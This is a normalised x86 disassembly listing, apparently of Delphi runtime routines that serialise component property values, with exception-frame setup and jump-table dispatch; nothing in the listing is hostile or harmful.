mov ebx [ ebp - 0x10 ]
mov al 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_3a819cc
pop ecx
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a81ace
lea eax [ ebp - 0x14 ]
call sub_3a652a0
retn
sub_3a81ad8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_3a81b5f
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a77148
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_3a75d40
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a77148
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_3a75db4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a81b66
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_3a65e38
retn
sub_3a81b70
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_3a81540
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_3a81c35 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a767bc
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
push ebp
call sub_3a81570
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_3a815c8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_3a8167c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_3a817a4
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_3a81a38
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_3a81ad8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_3a81624
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_3a818f0
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a767bc
test [ eax + 0x24 ] 0x4
je r-xdata
sub_3a81cd8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_3a81d20
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_3a65504
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a82b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a81d27
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a81d2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_3a81db2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_3a76534
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_3a82d84
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_3a7688c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a82b80
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_3a82b80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a81db9
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a81dc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_3a81e20
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_3a79c7c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_3a81354
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_3a81290
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a81e27
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a81e2c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a81ec2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_3a65338
xor eax eax
push ebp
push sub_3a81ea5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_3a652a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_3a80b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a81eac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_3a652f4
retn
sub_3a81ed0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_3a81fba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a767bc
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
movzx eax [ eax ]
cmp eax 0x9
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a81fc1
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
jmp [ eax * 4 + jump_table_3a81f1a ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_3a81dc0
pop ecx
jmp r-xdata
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a80aec
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_3a80b3c
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3a81d2c
pop ecx
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_3a76540
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a81290
sub_3a81fc8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a76e24
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
movzx eax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a81200
mov esp ebp
pop ebp
retn
sub_3a82008
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a77240
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a813c8
pop ecx
pop ecx
pop ebp
retn
sub_3a82044
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_3a82099
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a76c64
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_3a82ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a820a0
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub_3a820bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a821ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_3a652f4
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_3a652f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a821b2
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_3a652a0
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_3a655b8
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_3a820a4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_3a65634
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_3a820bc
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_3a65634
jmp r-xdata
sub_3a821e4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_3a823e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a767bc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_3a82d84
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a823e7
lea eax [ ebp - 0x14 ]
call sub_3a652a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_3a65338
xor eax eax
push ebp
push sub_3a82359
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_3a65504
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_3a65634
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_3a81478
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_3a652f4
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_3a767bc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_3a820bc
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_3a81290
jmp r-xdata
sub_3a823f8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_3a824b5
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a772a4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a6efcc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_3a82d84
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a824bc
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_3a820bc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_3a81290
sub_3a824d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a82556
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a771c8
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
lea edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a81290
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_3a82d84
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8255d
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
sub_3a82564
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_3a825bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a77148
mov eax [ ebp + 0x8 ]
push eax
call sub_3a81cd8
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a82720
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a825c4
lea eax [ ebp - 0x10 ]
call sub_3a70c6c
retn
sub_3a825c8
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_3a82d98
mov eax [ ebp - 0x4 ]
push [ eax + 0x4c ]
push [ eax + 0x48 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_3a81b70
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_3a81540
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_3a767bc
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_3a82692 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_3a767bc
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_3a81ed0
pop ecx
jmp r-xdata
push ebp
call sub_3a81fc8
pop ecx
jmp r-xdata
push ebp
call sub_3a82044
pop ecx
jmp r-xdata
push ebp
call sub_3a821e4
pop ecx
jmp r-xdata
push ebp
call sub_3a824d4
pop ecx
jmp r-xdata
push ebp
call sub_3a82564
pop ecx
jmp r-xdata
push ebp
call sub_3a82008
pop ecx
jmp r-xdata
push ebp
call sub_3a823f8
pop ecx
sub_3a82720
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a82afc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a75e94
test al al
je r-xdata
mov eax ebx
call sub_3a75d2c
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_3a72f70
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_3a8126c
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_3a71610
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_3a81354
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_3a746a4
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
call sub_3a82ccc
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a82b03
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x34 ]
call sub_3a66cb4
lea eax [ ebp - 0x30 ]
call sub_3a652a0
lea eax [ ebp - 0x2c ]
call sub_3a65a7c
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
xor eax eax
push ebp
push sub_3a82aa0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_3a7618c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_3a8279e ]
mov eax ebx
call sub_3a720e0
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_3a813c8
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_3a72a2c
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_3a73f84
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x8 ]
call sub_3a82c78
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_3a74c70
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_3a6efcc
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x8 ]
call sub_3a82d84
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_3a82d84
jmp r-xdata
mov eax ebx
call sub_3a72f70
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_3a81224
jmp r-xdata
mov eax ebx
call sub_3a72f70
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_3a81200
jmp r-xdata
mov eax ebx
call sub_3a738cc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_3a81248
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_3a73f84
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
call sub_3a82c78
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x8 ]
call sub_3a82d84
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x8 ]
call sub_3a82d84
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3a82a8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x14 ] eax
push 0x400
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d714
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_3a82a35
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x1c ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
call sub_3a64260
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_3a65504
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x18 ]
call sub_3a82c78
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x18 ]
call sub_3a809ec
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_3a809ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a82a3c
mov eax [ ebp - 0x18 ]
call sub_3a64380
retn
sub_3a82a3c
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x1c ] eax
mov dl 0xa
mov eax [ ebp - 0x8 ]
call sub_3a82d84
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_3a809ec
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_3a809ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_3a64380
mov eax [ ebp - 0x10 ]
call sub_3a64380
retn
sub_3a82b1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a82b62
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_3a655b8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a82b80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a82b69
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a82b80
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
test eax eax
je r-xdata
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_3a809ec
mov eax esi
call sub_3a65730
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_3a809ec
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_3a82bcc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_3a656c8
je r-xdata
mov eax esi
test eax eax
je r-xdata
mov [ esp + 0x4 ] edi
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
sub eax 0x4
mov eax [ eax ]
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_3a82d84
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_3a809ec
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_3a809ec
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
mov dl 0xc
mov eax ebx
call sub_3a82d84
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_3a809ec
mov dl 0x6
mov eax ebx
call sub_3a82d84
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_3a809ec
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_3a809ec
sub_3a82c78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a82cbd
push [ fs : eax ]
mov [ fs : eax ] esp
